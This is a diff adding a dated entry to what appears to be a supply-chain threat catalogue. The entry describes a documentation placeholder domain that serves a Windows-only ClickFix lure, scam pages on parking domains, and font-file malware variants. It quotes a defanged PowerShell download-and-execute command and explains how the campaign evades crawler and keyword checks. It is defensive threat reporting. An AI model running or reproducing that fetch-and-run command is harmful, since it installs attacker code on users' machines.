@@ -1,4 +1,23 @@
 entries:
+- date: '2026-09-26'
+  id: placeholder-domain-clickfix
+  title: Placeholder domain third-party.com turned live ClickFix server (AS289)
+  items:
+  - 'New AS289 (Manifold Security): third-party[.]com — a documentation placeholder in 1,500+ files
+    across 1,700+ repositories (Chromium docs, Sanity/Vercel skills, MCP-server docs) — is not
+    IANA-reserved and was registered by someone else. Since at least June 2026 it has served a
+    Windows-gated ClickFix lure (fake Cloudflare check, clipboard poisoning, Win+R → PowerShell
+    irm elxxvvx[.]xyz/f | iex). macOS/Linux crawlers get a benign decoy, so reputation feeds and
+    static checks see nothing; IPFire listed and de-listed it in July for exactly that reason.
+    Platforms: cdn, ai-agents, windows.'
+  - 'Follow-up (24 Sep, same team) attached: 350,000+ GitHub files cite placeholder domains serving
+    scams — parking pages your-domain[.]com / yoursite[.]com served macOS scareware and counterfeit
+    BBC/ZDF investment-fraud pages in 2 of 16 macOS renders; every static check cleared them.'
+  - 'OSM PolinRider A/B-testing follow-up (26 Sep) attached to AS35: force-pushed fa-solid-500.woff2
+    (3 Sep) and fa-solid-900.woff2 (25 Sep, all three Binary-Mindz repos within eight minutes) variants
+    evade keyword detections; 853 recovered force-pushes document the 8-month infection.'
+  - 'Socket “Happy Birthday, Shai-Hulud” one-year retrospective (18 Sep) attached to AS48 — same
+    incident, retrospective coverage.'
 - date: '2026-09-25'
   id: defcon34-talks
   title: DEF CON 34 supply-chain talks added as technique origins
